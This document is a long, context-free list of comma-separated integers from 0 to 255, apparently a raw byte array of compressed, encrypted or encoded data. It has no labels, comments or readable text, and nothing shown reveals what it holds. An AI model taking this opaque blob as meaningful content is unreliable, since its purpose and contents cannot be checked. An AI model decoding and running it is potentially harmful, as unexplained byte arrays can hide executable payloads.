42,108,7,1,38,36,128,147,130,40,75,211,97,184,250,60,115,110,108,101,187,252,170,100,124,50,145,212,203,31,127,8,193,205,204,169,164,45,100,120,224,160,165,241,189,166,228,135,151,27,10,1,20,7,91,93,161,176,166,85,186,171,231,173,116,65,23,27,247,214,90,89,76,102,27,158,160,15,250,31,122,97,226,229,108,8,62,75,88,1,214,90,4,28,17,146,223,221,227,116,124,45,40,97,103,63,107,27,112,43,199,215,155,124,5,202,35,203,159,113,123,103,217,127,186,174,221,127,114,116,155,254,205,1,81,81,248,223,172,186,164,113,17,113,166,160,233,171,191,173,191,223,209,12,1,79,90,92,16,79,230,175,75,54,176,177,238,245,49,27,83,31,165,68,26,22,80,22,4,146,231,87,92,68,58,57,235,175,109,17,38,90,52,203,134,80,65,65,90,139,209,150,239,22,55,58,109,39,38,109,44,81,126,177,154,230,151,106,9,199,97,184,128,121,0,103,215,54,242,190,185,32,13,47,171,245,130,92,105,1,158,153,151,167,27,45,105,126,186,161,161,224,191,230,239,172,209,66,18,31,64,19,52,30,81,173,23,18,232,243,167,249,127,8,76,39,184,10,95,0,89,20,90,205,187,30,64,81,63,41,146,185,55,44,35,35,45,155,140,16,90,46,49,146,145,218,38,125,48,57,103,35,102,125,120,39,44,174,247,147,159,97,2,192,35,204,15,60,112,119,207,48,187,190,252,110,54,172,193,216,148,19,13,92,155,205,71,224,14,117,21,58,227,171,189,171,191,170,233,237,195,53,113,76,10,117,92,58,73,247,80,85,232,253,231,247,61,46,13,114,251,72,78,95,75,18,0,143,149,30,75,19,108,43,226,254,103,96,62,59,47,157,157,75,44,92,83,156,129,150,113,99,112,78,60,76,60,63,116,58,111,174,132,194,130,117,4,203,216,156,84,100,118,33,202,53,179,173,170,118,106,188,218,185,218,92,16,25,206,143,86,225,104,110,29,42,166,178,188,225,191,160,229,237,218,12,18,13,87,93,16,5,16,241,10,28,232,250,248,33,52,113,11,102,181,26,95,15,11,21,147,134,153,51,92,13,63,57,167,254,57,100,83,102,114,237,204,3,25,91,195,198,195,141,11,54,112,100,103,122,32,122,113,33,110,169,129,131,194,46,222,211,214,144,70,102,117,115,219,39,231,183,237,107,61,188,157,191,130,19,13,10,203,213,86,184,113,113,10,104,250,240,173,161,160,216,243,177,212,84,93,4,16,5,74,15,12,192,94,70,143,250,253,112,43,121,23,62,238,10,27,28,53,20,209,150,203,5,64,79,46,55,176,96,108,107,99,24,41,137,134,66,47,93,149,202,159,139,49,108,42,111,103,236,32,46,26,54,126,164,219,202,204,116,134,211,194,215,83,36,47,98,149,160,186,239,246,41,101,188,192,185,139,81,2,14,128,138,26,243,23,39,95,187,244,177,239,166,197,227,238,234,233,88,77,1,29,19,65,20,0,163,94,94,248,250,230,32,111,116,22,43,231,95,1,26,43,72,147,202,151,15,82,83,108,216,176,97,60,112,99,50,114,197,100,0,116,55,154,221,217,148,122,116,96,204,63,167,42,47,120,58,63,220,220,193,252,53,192,221,206,184,29,113,5,92,199,185,253,231,251,117,61,254,218,185,71,81,14,7,194,208,86,169,30,112,69,233,228,181,249,248,160,141,236,232,17,22,64,3,24,2,65,78,12,182,77,138,255,240,186,35,115,92,65,45,63,72,17,86,45,7,193,225,214,64,75,35,54,216,132,49,119,119,39,127,47,129,98,26,125,10,220,154,223,221,38,193,43,192,100,208,123,123,120,99,42,164,160,193,166,111,220,223,206,217,29,16,115,14,158,250,189,174,172,110,51,170,238,191,74,1,29,11,203,193,63,165,4,11,20,177,231,162,228,240,179,188,254,170,90,54,11,31,65,19,82,31,114,93,77,157,240,128,186,33,37,52,15,44,40,41,86,7,104,95,147,136,149,85,68,112,122,159,176,49,126,117,47,59,241,206,126,0,56,82,198,130,207,13,105,144,46,154,40,180,38,99,52,103,252,173,182,215,175,112,156,139,156,213,69,74,113,22,196,187,179,236,185,105,177,157,171,191,8,93,65,9,135,193,82,73,4,26,95,252,230,162,255,168,97,254,255,248,11,0,40,66,8,114,94,31,0,71,23,223,175,240,253,50,47,122,63,42,111,7,67,12,44,7,147,204,221,21,9,53,34,155,250,12,102,96,88,112,176,137,99,0,63,0,220,129,196,30,10,218,43,216,59,180,122,117,33,127,225,177,170,131,167,48,216,129,141,18,21,24,112,70,132,233,191,190,94,103,224,239,176,228,93,92,90,17,202,91,86,13,85,4,21,229,154,183,181,187,123,251,172,186,91,71,17,84,92,129,75,15,1,83,94,147,173,227,250,36,98,122,107,43,47,80,34,7,60,154,128,142,153,84,94,35,32,135,226,98,45,107,43,59,170,129,54,13,125,95,197,144,154,87,103,145,58,153,40,255,112,35,42,125,166,169,175,131,190,112,138,195,221,64,81,24,112,8,146,168,252,167,83,53,171,233,236,183,8,75,65,254,218,83,78,16,116,10,69,250,187,242,93,240,42,176,168,246,73,66,86,43,8,214,29,68,80,83,12,145,253,187,56,77,33,43,59,62,106,0,90,1,126,155,132,236,138,79,0,97,72,155,100,89,7,60,39,36,234,207,119,86,50,218,205,144,141,92,105,192,44,155,224,251,122,109,42,100,168,233,239,131,168,158,156,210,215,30,69,86,109,10,223,164,176,233,21,51,243,242,249,183,0,15,92,158,219,1,17,73,61,18,10,251,40,174,14,176,40,176,225,248,73,90,19,120,28,134,70,77,78,0,76,147,129,172,59,42,36,97,59,62,117,70,94,102,46,202,132,221,205,71,29,96,213,151,122,125,119,121,97,60,175,153,101,98,46,209,150,218,131,7,121,128,51,192,235,188,7,97,48,43,164,241,175,171,247,188,141,233,139,30,79,24,107,16,75,164,234,190,28,19,146,239,249,52,6,75,108,226,219,83,87,10,3,28,219,229,24,186,17,186,57,166,136,160,88,111,10,40,4,204,69,94,12,83,134,223,217,172,54,60,37,116,51,113,113,120,80,112,110,220,132,151,213,73,6,50,217,143,33,33,110,6,47,123,182,169,119,124,117,221,196,218,141,70,32,148,130,145,177,165,98,97,104,125,166,181,184,179,234,229,157,195,135,1,21,81,16,16,69,187,177,224,20,111,177,171,245,45,24,68,22,229,209,95,94,72,72,7,146,233,54,240,73,166,57,170,164,126,93,62,65,46,90,220,29,4,91,7,129,149,148,235,55,33,101,56,43,59,110,118,17,26,117,203,159,241,139,8,192,123,192,158,56,60,11,121,39,252,173,181,121,97,41,145,212,246,131,15,75,157,153,138,169,184,45,124,104,122,224,239,234,186,252,253,157,195,199,0,110,16,82,70,76,252,177,250,14,110,253,140,240,49,0,16,25,163,150,1,1,23,26,27,204,233,87,171,85,240,48,242,185,118,69,126,75,61,80,135,82,84,68,67,154,210,209,161,101,50,37,38,118,102,103,44,87,109,117,201,198,135,109,9,199,51,129,197,123,125,110,206,43,187,172,160,47,106,111,208,212,205,26,12,77,144,171,209,169,160,43,36,102,244,160,255,176,167,176,130,141,195,90,80,28,76,81,18,93,251,220,250,78,226,225,226,234,88,17,13,79,247,131,17,89,27,7,1,158,176,27,186,20,122,42,172,255,44,27,126,2,116,4,148,66,88,91,11,198,140,152,239,54,44,78,50,107,124,125,120,27,38,46,145,215,130,36,71,218,108,217,133,42,115,33,196,47,235,176,176,100,61,117,145,227,145,92,30,15,196,197,209,169,236,112,121,58,237,224,173,184,179,173,253,170,209,12,91,66,10,65,22,85,168,173,71,20,228,224,186,239,61,25,81,7,163,92,26,78,74,11,70,215,254,87,6,73,118,53,247,245,126,71,114,14,127,163,221,82,84,45,28,198,210,140,160,103,59,63,73,113,114,125,120,91,119,255,202,198,199,50,5,218,55,208,216,36,2,127,152,53,252,182,185,111,97,170,201,227,214,71,87,74,128,223,145,177,23,113,15,121,224,188,185,236,170,190,243,183,155,70,70,31,20,29,30,79,84,248,94,15,249,161,238,161,115,70,23,127,181,26,16,40,87,7,80,221,219,65,64,84,32,112,160,181,38,16,99,43,101,152,152,0,88,72,83,202,145,218,27,125,93,111,124,63,51,53,120,127,114,175,156,143,158,108,19,129,52,202,81,97,114,60,215,41,191,253,252,111,126,177,128,242,145,118,125,25,128,223,77,176,101,110,55,123,236,230,188,175,179,148,175,246,138,29,74,13,1,81,16,74,26,241,82,28,224,146,167,240,111,56,18,50,175,88,7,43,85,11,28,202,151,69,27,84,61,46,182,237,55,112,118,32,127,163,214,66,25,72,50,192,129,139,43,99,118,35,59,39,98,126,112,58,102,189,129,144,156,110,90,218,156,203,15,124,112,60,130,39,161,170,174,126,102,173,221,183,155,81,30,25,218,216,23,189,3,52,98,100,177,170,239,168,164,250,191,160,151,76,18,28,74,5,82,84,58,175,78,4,141,177,252,112,49,56,20,127,181,88,17,66,1,95,215,220,205,94,91,79,118,49,242,103,51,106,111,32,61,137,221,75,88,26,149,154,133,152,59,120,58,62,62,32,126,57,49,122,48,239,199,143,164,117,216,157,215,207,5,123,0,45,215,110,241,185,251,116,32,188,201,200,142,90,76,65,203,220,71,191,85,43,84,102,182,224,228,160,167,176,191,248,195,29,93,1,90,10,23,81,88,178,79,28,194,246,161,59,53,119,3,119,229,43,91,88,112,20,203,141,137,91,94,24,46,123,244,53,108,104,127,24,61,232,135,16,109,89,157,139,141,128,38,103,51,62,56,248,97,97,109,3,55,173,208,143,178,31,138,193,216,186,73,42,113,124,143,206,235,188,163,37,107,183,217,248,205,7,2,16,211,172,23,167,15,98,8,253,244,235,161,236,241,226,229,248,209,71,77,1,74,81,65,76,20,183,28,148,167,251,188,34,46,33,10,55,178,89,80,71,100,15,138,141,220,89,94,83,62,153,176,115,105,105,63,62,47,144,127,76,101,16,218,184,204,136,105,54,46,209,122,166,48,109,107,96,24,189,154,139,236,101,200,219,206,192,88,42,33,18,143,168,187,190,219,105,48,177,227,246,17,81,23,11,214,196,31,187,5,11,79,241,189,170,206,168,161,230,175,234,64,70,75,94,27,93,90,85,86,173,79,137,228,240,190,115,105,47,10,46,117,72,2,89,46,30,147,158,153,5,16,45,56,129,241,49,24,44,120,33,172,197,110,0,56,26,216,135,159,152,101,144,49,202,124,184,48,34,61,96,55,254,146,193,168,51,217,139,220,217,95,64,112,12,197,186,179,236,177,103,97,236,232,245,65,11,14,65,141,138,94,224,79,28,79,248,225,198,200,168,186,225,249,234,25,12,2,72,92,0,92,19,57,17,78,142,171,170,249,50,116,119,124,62,113,65,27,28,60,11,155,220,208,19,27,47,32,213,171,97,38,45,99,96,173,145,37,66,63,68,220,139,157,92,116,222,109,216,36,180,102,109,116,103,230,170,180,193,172,48,200,221,194,119,84,74,109,93,149,177,170,186,185,127,229,235,176,191,26,11,14,94,218,219,78,89,4,2,15,140,230,237,173,191,43,176,191,177,0,92,22,85,8,81,29,77,75,90,82,128,173,237,230,50,52,42,122,62,125,94,89,78,44,17,209,193,208,38,64,70,32,155,238,39,44,45,50,62,182,220,37,82,2,65,218,140,141,6,123,192,58,167,60,180,97,100,100,122,164,233,170,204,247,110,193,218,140,26,82,90,48,15,195,240,179,250,15,118,234,240,249,166,73,1,108,8,206,95,86,79,1,30,121,233,160,187,28,161,97,225,137,235,6,6,2,104,71,204,0,68,88,1,82,220,224,235,226,96,62,122,51,119,40,1,77,78,48,193,139,204,144,78,82,47,60,241,246,125,17,117,88,36,190,154,35,26,125,93,157,139,195,15,97,210,122,167,59,173,108,100,117,58,234,174,161,151,178,62,140,207,214,74,82,24,49,30,196,252,247,225,83,119,186,230,249,248,8,90,23,247,208,64,82,85,25,27,84,189,181,177,5,166,109,250,225,236,91,6,64,127,77,219,6,68,23,83,94,157,167,241,99,106,98,41,32,35,27,68,12,46,46,134,209,142,219,73,16,35,46,153,39,49,124,55,101,36,173,209,47,87,51,139,221,139,132,30,96,134,34,202,160,203,113,117,122,115,165,244,168,143,234,253,221,195,129,18,29,20,113,30,219,161,163,204,28,63,243,176,183,229,4,3,23,163,203,1,94,78,88,10,14,189,66,237,78,168,97,176,172,236,69,59,26,47,90,157,0,68,88,44,87,142,152,243,124,42,45,108,36,55,63,11,10,112,104,132,220,151,145,14,10,48,208,159,102,127,126,121,39,86,249,135,56,126,111,199,194,208,167,76,113,220,197,201,253,161,4,123,60,96,211,189,236,225,173,234,141,195,129,3,15,10,44,30,74,191,137,187,99,126,255,187,182,40,64,65,29,227,134,28,87,28,1,30,202,252,19,172,93,177,45,187,237,248,94,116,76,66,26,148,28,94,88,70,129,140,203,247,55,106,127,56,42,124,113,55,77,60,104,216,128,156,203,82,192,117,144,213,127,49,110,31,39,102,236,164,37,42,109,219,216,150,158,13,125,222,153,212,189,180,45,53,97,97,230,181,184,231,171,130,209,195,171,26,73,22,1,87,9,250,225,239,78,116,167,248,171,52,4,71,2,251,128,64,61,85,95,27,204,133,15,172,93,225,123,252,227,114,90,106,14,61,27,128,71,21,92,29,129,207,202,173,122,42,121,119,35,48,117,60,23,44,43,157,154,142,215,82,195,35,151,222,9,33,102,44,104,245,236,252,97,19,56,139,157,138,155,11,23,134,213,151,169,246,13,47,126,225,186,164,171,162,173,159,156,139,140,80,1,90,1,74,59,177,241,185,94,53,225,231,235,36,0,13,28,227,139,95,89,1,11,30,214,167,4,227,5,164,19,173,228,119,11,36,16,53,0,152,82,15,42,70,220,137,138,245,116,50,61,58,122,48,125,54,23,126,53,157,199,203,101,21,178,50,190,197,112,55,124,133,53,191,252,251,119,38,125,197,218,147,0,97,25,222,168,151,161,163,98,109,58,151,186,184,177,199,230,239,200,205,28,64,94,74,7,30,78,205,251,162,9,188,255,226,182,61,31,75,29,255,64,74,86,27,85,80,158,171,25,177,85,104,42,160,172,50,95,117,80,43,74,131,18,94,64,50,198,212,128,234,99,112,96,49,42,59,47,120,67,108,40,152,141,151,48,84,145,35,155,207,121,49,125,198,104,179,241,169,123,114,125,208,254,139,0,127,14,219,219,207,165,184,114,82,42,176,234,173,250,179,240,180,186,147,70,1,30,84,31,10,76,252,176,28,79,137,234,173,249,61,28,84,29,180,72,93,94,73,78,0,215,172,3,68,5,109,123,134,142,60,71,37,16,53,133,134,33,77,65,95,139,148,192,49,98,59,57,106,32,114,110,42,1,108,189,202,147,130,116,79,192,35,213,132,104,99,102,143,115,191,183,235,97,96,188,145,164,205,114,92,82,198,132,193,229,67,114,21,42,224,246,249,170,167,176,241,234,205,27,28,5,11,113,30,85,81,182,28,9,164,225,139,225,47,16,11,48,228,28,26,15,74,18,18,151,138,27,82,31,108,97,245,186,109,69,101,42,51,137,128,90,46,72,1,146,157,143,122,32,103,57,40,122,123,49,116,123,108,189,155,203,128,107,2,154,108,129,9,127,44,32,215,41,187,253,171,117,122,172,197,164,142,3,92,91,198,132,28,176,27,113,5,48,182,178,184,250,231,160,180,234,203,70,1,79,10,27,65,20,80,173,94,15,232,226,231,241,53,52,76,38,227,68,29,71,16,15,128,142,193,3,68,9,118,118,200,237,49,104,36,32,91,202,148,90,31,7,74,146,217,218,125,116,65,36,56,114,101,47,107,23,107,173,129,147,150,124,80,145,194,141,73,96,55,61,182,101,179,148,235,37,114,238,193,163,139,1,81,0,154,132,16,235,31,106,17,104,253,188,163,189,187,242,229,232,167,12,71,68,65,75,16,73,81,183,33,16,251,255,231,42,44,46,76,42,229,90,21,1,74,7,203,209,144,69,74,72,61,107,160,49,126,107,55,50,127,137,148,86,21,92,192,156,129,148,124,38,34,36,112,184,126,33,116,21,114,175,136,131,142,114,222,129,220,158,14,42,42,44,217,47,250,162,168,43,37,159,141,246,130,1,23,92,163,221,82,207,23,116,29,122,231,186,161,234,235,177,191,225,208,26,2,79,28,6,23,5,88,187,75,125,137,240,231,97,47,43,27,40,229,10,7,26,52,78,247,132,230,87,64,58,39,158,240,96,49,48,120,123,41,203,140,81,125,80,155,156,133,209,105,38,44,33,97,166,124,125,49,111,44,255,202,144,173,86,129,148,157,207,29,125,122,124,207,164,231,222,171,40,48,129,218,165,28,6,28,8,210,221,28,187,27,39,73,187,182,170,165,228,231,252,243,172,155,93,16,28,8,87,65,93,11,163,12,145,191,166,250,38,105,56,91,106,255,65,12,89,47,21,129,158,255,21,28,62,61,155,172,89,108,48,47,96,107,206,53,87,51,68,196,132,194,223,40,120,43,128,103,241,32,63,59,58,126,171,180,193,183,114,135,154,156,193,14,96,122,122,133,166,179,246,176,43,114,170,209,183,65,71,113,16,206,205,77,186,85,30,126,224,252,186,161,168,171,160,180,240,94,88,80,1,6,0,52,78,17,66,94,223,228,227,249,34,116,48,66,55,63,91,27,22,42,11,130,180,149,69,65,51,102,132,226,89,110,121,121,112,173,157,53,74,50,10,212,129,141,192,32,220,51,154,97,172,16,101,110,115,241,177,175,234,173,117,214,129,140,209,21,13,119,30,195,160,187,160,177,103,98,235,235,185,8,75,14,8,203,205,26,78,14,28,73,231,179,250,165,164,235,160,252,186,29,69,16,28,8,0,91,18,29,90,82,216,255,227,253,62,127,44,32,124,104,16,79,90,60,72,209,151,193,14,74,123,4,195,160,98,44,112,47,50,170,144,35,74,113,26,179,136,149,82,43,192,48,242,59,251,55,126,49,103,224,165,236,153,148,21,226,194,221,74,126,10,59,76,196,224,153,174,171,110,224,246,235,190,8,94,29,21,132,67,78,68,85,93,89,252,182,177,187,240,53,170,175,183,17,12,86,85,75,31,69,4,12,66,76,220,152,251,250,124,98,52,42,50,41,64,81,22,43,21,209,198,145,75,90,106,59,135,236,115,126,121,49,43,255,144,119,95,104,91,216,205,149,93,123,134,109,216,96,167,96,127,39,96,160,189,180,146,251,62,208,155,214,1,92,9,49,6,217,130,153,239,13,113,255,183,183,175,6,93,25,16,144,17,86,27,23,84,84,136,244,224,59,168,53,176,162,186,7,76,2,68,27,214,10,89,20,68,77,223,255,245,51,102,121,40,35,109,47,91,1,88,46,153,193,142,151,85,64,47,60,210,251,115,103,117,39,123,236,207,98,7,47,199,197,205,157,18,49,155,48,151,97,167,110,127,127,96,187,239,184,131,190,55,192,214,215,30,79,24,33,81,219,191,173,162,122,46,255,240,211,163,74,10,71,249,202,26,77,64,27,80,14,249,69,236,85,215,124,176,162,177,73,18,14,112,4,148,91,21,88,7,24,157,249,161,116,112,62,43,97,113,56,72,82,118,93,157,128,142,142,31,0,35,39,134,127,97,102,48,63,126,171,198,123,33,62,197,216,130,141,14,43,193,42,145,230,236,115,57,33,58,165,151,206,224,172,236,216,150,199,18,98,74,107,92,9,240,173,185,10,117,250,183,247,190,74,79,71,187,128,71,28,89,23,109,29,233,5,240,78,234,57,235,227,235,6,99,22,61,1,128,6,93,80,69,86,148,150,187,125,24,63,41,103,55,47,49,37,108,111,218,128,128,144,8,1,50,209,130,33,97,13,24,43,50,247,156,100,122,110,139,150,144,131,30,105,222,219,140,230,246,98,97,104,115,178,165,234,191,247,165,193,155,131,30,19,24,29,13,76,189,237,132,79,117,255,166,240,41,26,3,2,254,203,64,94,89,25,109,137,229,87,181,24,224,57,224,254,114,91,99,73,41,65,129,91,103,64,64,221,148,144,245,120,33,45,106,51,62,53,58,1,49,47,136,135,218,214,73,223,108,205,133,125,127,110,33,43,106,173,168,101,106,56,201,140,142,200,92,16,128,132,214,169,246,54,97,10,105,253,189,247,186,178,253,141,215,206,118,79,90,1,92,74,189,163,250,85,103,176,250,191,51,29,103,23,182,206,83,77,27,30,27,140,240,19,183,73,252,91,182,191,110,6,118,102,127,4,133,64,92,32,26,220,141,141,250,124,37,108,47,39,32,108,52,90,44,60,193,218,204,109,14,223,123,209,158,125,103,110,96,43,213,167,185,123,114,63,175,183,225,167,81,10,193,195,154,169,230,110,99,60,236,188,135,180,187,167,180,218,213,220,0,5,81,3,30,73,186,178,250,15,251,167,231,173,61,31,10,14,190,232,93,90,87,20,6,142,241,65,182,93,234,32,171,248,114,69,126,14,52,8,128,74,77,28,95,146,210,249,227,116,96,62,103,43,59,105,43,12,49,48,136,143,204,116,73,178,35,151,133,39,58,125,149,46,225,166,161,110,42,97,201,155,202,81,70,25,128,205,155,204,189,116,4,97,227,224,245,170,225,169,187,154,219,22,7,30,1,114,13,72,230,163,235,28,225,177,186,238,89,8,26,90,251,92,7,43,75,95,0,209,160,24,235,15,58,48,176,255,38,0,55,24,52,158,152,81,65,90,95,132,147,150,227,32,42,121,100,124,55,51,112,67,126,47,153,138,130,104,85,151,51,203,151,58,59,110,222,52,153,176,183,3,62,63,139,185,154,26,76,77,192,195,204,228,15,113,69,104,150,251,173,184,189,183,175,224,209,22,26,95,74,1,122,93,166,226,77,14,249,177,175,155,44,27,15,54,230,4,11,92,16,69,64,158,171,24,90,15,38,118,240,225,126,73,55,64,124,219,128,78,65,41,70,131,145,140,97,120,8,98,96,76,124,116,118,74,60,173,154,193,203,3,78,150,35,209,79,113,122,122,215,39,170,235,172,21,126,166,197,254,140,90,8,65,196,140,154,176,14,115,82,39,187,170,191,184,235,224,253,224,140,17,70,73,74,65,13,75,88,241,77,94,228,243,186,234,124,47,65,44,247,72,28,88,60,20,4,220,136,69,65,5,108,123,171,248,59,29,38,112,116,192,135,66,85,6,68,146,213,142,105,102,107,111,59,124,19,110,118,126,60,189,136,226,241,124,84,194,58,200,82,39,113,38,215,117,187,168,172,63,96,146,199,249,203,71,11,77,192,222,86,187,4,39,88,125,244,152,190,234,163,160,236,248,138,6,74,66,24,7,92,68,23,247,28,99,250,233,186,234,111,41,91,48,249,13,91,28,26,21,128,143,139,89,30,81,32,123,226,185,114,105,117,34,46,145,130,78,5,6,220,132,196,141,123,122,34,100,106,51,97,124,112,49,108,174,155,138,142,56,75,154,221,208,21,42,55,110,215,117,179,189,235,127,59,247,219,245,140,4,92,77,218,222,61,169,95,35,124,66,187,190,238,168,161,230,245,248,195,84,11,3,26,7,45,9,57,173,28,11,228,225,172,106,111,122,3,113,239,72,67,12,47,73,209,140,253,87,16,57,32,57,242,39,108,119,59,39,105,192,246,13,65,16,134,128,196,204,61,44,96,36,36,246,60,63,44,98,102,252,220,131,130,109,218,192,129,155,11,11,115,43,215,240,191,186,170,118,38,186,134,163,196,81,92,65,210,132,28,235,0,58,29,125,182,174,180,186,162,166,152,241,129,71,64,79,91,26,65,81,81,247,23,14,228,227,172,50,124,45,3,91,144,7,71,7,60,72,155,138,141,66,28,85,57,222,234,62,114,42,120,33,111,157,198,87,111,10,196,138,223,200,105,116,50,154,40,167,32,112,59,96,60,233,198,139,178,116,156,198,194,150,20,104,99,124,197,234,250,167,251,51,96,237,201,227,29,88,76,21,194,213,26,165,23,122,84,233,182,172,184,160,225,242,152,142,91,77,14,65,65,31,82,83,84,163,76,223,250,239,231,38,43,45,80,46,225,92,81,91,117,67,147,142,220,68,67,54,61,153,244,98,105,109,59,59,49,158,17,90,62,94,212,130,196,220,59,59,43,216,100,236,99,32,42,115,38,242,177,202,190,107,143,193,194,202,8,42,111,74,215,164,250,174,234,116,59,242,233,254,74,92,90,25,128,205,82,241,79,1,69,229,151,183,255,186,179,187,178,177,90,93,22,25,90,90,16,73,84,95,86,142,253,251,230,102,37,56,22,113,25,89,81,66,126,15,147,180,153,14,29,96,59,213,245,115,42,110,59,34,173,192,101,84,113,41,134,156,242,144,101,157,112,209,124,180,60,109,113,54,190,255,171,131,236,51,218,194,206,204,14,19,111,30,217,215,240,160,185,105,124,237,249,183,26,27,71,123,141,223,80,79,88,93,4,248,182,176,135,160,160,231,225,237,81,21,22,13,119,92,74,65,88,71,80,137,173,250,252,34,116,42,127,44,109,28,12,64,47,17,199,144,144,5,75,119,34,207,235,96,126,106,52,50,252,137,36,66,113,72,176,154,131,12,101,155,49,203,106,180,38,33,97,125,208,243,175,148,190,112,200,181,198,80,20,87,114,13,215,234,231,230,225,118,253,188,239,187,105,90,111,25,194,75,74,27,115,80,19,187,244,162,226,185,118,231,140,248,73,21,21,21,65,71,65,30,73,26,12,157,253,227,167,102,57,54,76,54,62,88,12,78,100,69,210,152,208,71,94,35,125,219,236,60,125,121,43,102,170,137,59,7,104,26,157,151,196,7,40,192,107,208,109,246,38,97,125,99,178,164,170,252,178,46,218,140,198,6,98,24,99,7,163,255,235,250,28,112,250,177,187,227,24,71,14,226,150,48,26,85,31,56,5,233,184,250,68,186,55,160,162,177,73,88,2,31,71,192,82,85,74,0,17,252,189,227,59,123,63,37,32,106,37,70,38,64,117,152,220,203,153,73,94,108,46,158,238,33,110,45,46,112,190,145,34,75,113,155,128,130,213,11,11,192,108,202,60,248,72,100,102,96,163,245,244,215,250,178,134,215,194,64,21,110,33,22,143,161,236,167,20,107,186,247,161,191,27,26,24,251,154,48,17,16,86,10,84,225,89,136,81,231,57,242,252,229,73,70,14,43,71,128,82,93,81,23,26,206,138,239,116,50,56,96,37,45,105,72,81,27,42,220,209,128,144,90,75,108,103,153,97,102,60,106,100,60,190,137,62,124,63,197,128,192,129,12,12,210,118,151,169,186,13,53,9,98,188,189,184,151,252,178,138,213,221,118,69,24,113,9,31,164,230,188,78,38,186,234,176,197,92,81,27,230,141,22,74,89,27,26,144,172,24,183,31,168,57,229,181,234,88,55,18,101,31,157,67,95,74,17,78,210,137,177,99,60,36,106,124,88,37,44,0,45,60,204,142,134,219,71,27,59,203,153,122,115,98,105,39,102,190,235,96,122,24,134,198,217,133,91,121,222,130,208,165,167,72,126,66,99,166,180,236,209,247,191,192,195,154,93,5,17,71,13,14,164,181,189,85,103,243,242,247,42,92,75,79,184,141,7,116,89,0,1,158,250,68,224,93,168,49,235,225,84,95,100,75,127,8,157,82,68,72,83,244,136,215,237,116,58,105,41,32,38,87,120,81,109,116,201,128,156,208,87,192,107,203,216,112,115,39,48,48,50,176,246,47,51,41,209,216,140,141,12,21,177,195,216,214,224,58,116,104,122,163,135,236,225,172,177,131,162,194,18,79,0,1,30,83,225,163,236,20,77,167,160,161,37,74,91,28,187,202,49,77,85,30,27,141,177,67,174,75,168,57,238,225,112,89,59,27,52,108,195,66,25,47,95,128,201,152,237,120,125,62,48,113,124,63,42,91,126,42,136,193,205,110,84,151,42,202,132,112,106,121,43,115,240,236,183,62,98,37,201,205,192,31,30,14,218,143,180,169,230,43,100,58,244,167,228,182,166,246,244,193,207,211,70,3,10,90,18,77,185,247,174,85,252,243,186,237,117,74,17,31,247,213,1,93,80,69,81,250,171,69,179,17,61,49,171,174,42,64,36,17,47,77,152,16,95,91,65,221,207,238,187,18,38,57,58,36,48,41,59,90,28,122,136,144,150,40,87,203,43,203,217,4,100,44,152,62,187,252,169,35,102,25,201,212,154,92,12,25,222,205,153,224,246,117,79,102,244,161,239,247,160,190,233,198,150,65,80,89,17,64,12,9,160,178,71,12,241,174,250,249,104,8,10,31,181,44,91,71,115,85,26,158,255,66,241,81,122,112,235,245,44,6,59,103,52,153,148,78,22,90,64,219,207,178,254,54,54,111,59,37,19,111,48,79,126,255,208,138,156,112,84,145,106,144,151,127,33,39,223,43,231,252,185,101,17,47,221,239,150,3,16,23,193,171,136,236,1,45,20,96,187,234,173,240,210,182,228,239,211,12,1,114,20,10,30,93,168,175,77,13,151,228,238,249,114,27,81,127,226,7,64,94,62,85,94,204,138,48,45,78,34,46,176,164,126,17,59,33,111,192,245,85,12,72,54,132,137,139,97,44,48,97,106,39,114,110,55,67,111,177,129,145,152,62,73,199,35,193,21,10,123,96,182,101,186,190,185,96,97,173,209,245,138,118,122,25,193,205,70,187,14,48,11,113,228,187,164,184,165,225,244,160,210,21,1,13,50,65,92,85,20,241,94,15,152,251,141,239,61,48,13,43,175,70,65,78,75,69,74,146,153,5,64,31,102,32,234,180,106,90,38,50,42,199,219,87,47,72,17,208,129,215,103,38,34,60,106,33,48,41,55,115,60,175,159,202,135,124,85,202,198,144,92,60,107,110,223,55,167,236,251,51,96,238,208,164,145,14,22,23,207,223,70,189,14,106,14,60,231,178,188,240,174,190,235,187,219,84,5,13,125,81,92,81,75,176,10,89,232,188,139,62,116,44,65,45,165,68,69,95,23,15,209,134,139,15,94,31,101,57,241,185,49,107,117,38,114,137,204,11,68,72,140,198,158,138,61,125,53,37,60,33,106,15,58,58,111,189,152,219,192,108,5,139,214,139,126,102,107,43,155,62,160,189,183,103,42,254,209,164,195,1,18,25,161,221,71,251,69,118,29,33,187,237,189,164,225,170,253,248,141,6,80,26,8,90,82,75,26,171,94,68,188,167,230,36,47,106,65,55,251,64,83,28,126,26,147,209,140,91,82,15,106,105,243,39,109,117,117,115,41,159,154,7,111,65,134,129,213,218,125,100,59,73,97,162,96,36,106,96,102,180,136,149,130,114,138,192,153,215,29,122,44,110,253,186,191,252,240,107,114,232,145,249,203,92,111,10,203,193,73,161,5,45,29,123,230,162,239,184,169,130,239,248,207,22,77,89,88,1,82,18,84,175,10,5,250,227,226,58,127,106,20,95,254,70,77,11,37,17,129,253,208,30,16,78,124,243,235,48,106,105,111,38,47,133,152,26,117,26,150,211,131,137,49,116,96,202,2,172,124,44,109,16,109,189,152,143,178,51,222,199,194,129,9,60,42,81,207,234,241,174,170,40,32,172,141,248,4,65,7,80,141,193,94,205,69,114,29,248,182,162,249,176,250,252,236,233,0,77,64,4,24,19,49,79,60,180,80,157,170,251,246,81,101,108,64,62,230,1,1,93,121,85,147,198,136,66,69,45,39,138,171,38,126,104,47,62,36,232,111,86,37,91,218,192,236,139,61,134,71,151,60,253,32,42,55,97,60,169,241,148,168,47,196,156,138,144,15,113,113,70,149,187,208,205,174,117,55,237,176,246,91,71,90,86,160,205,94,253,1,11,69,166,248,180,249,252,191,189,175,188,90,76,16,79,6,81,16,9,86,64,28,139,225,237,249,83,114,96,17,44,106,88,34,66,67,14,199,151,208,78,94,48,63,134,226,58,55,121,59,102,218,154,97,13,125,72,216,222,204,141,96,192,96,200,112,167,55,109,55,127,230,165,236,138,216,100,218,156,220,151,92,81,44,12,222,206,241,174,169,107,255,176,247,229,1,71,14,23,139,212,79,22,6,64,85,255,188,225,164,188,167,176,255,172,11,17,75,5,65,3,91,90,57,93,82,148,230,227,253,24,127,119,33,44,115,81,12,28,60,16,157,194,215,5,67,35,62,195,241,96,126,45,104,33,172,192,35,13,125,70,198,192,206,30,101,162,59,140,58,184,114,34,122,102,240,175,161,215,241,117,200,196,194,18,17,74,109,6,192,187,250,174,235,113,229,231,181,165,71,113,14,91,212,95,73,28,4,94,79,225,250,179,239,185,118,252,164,187,11,71,2,95,16,140,69,25,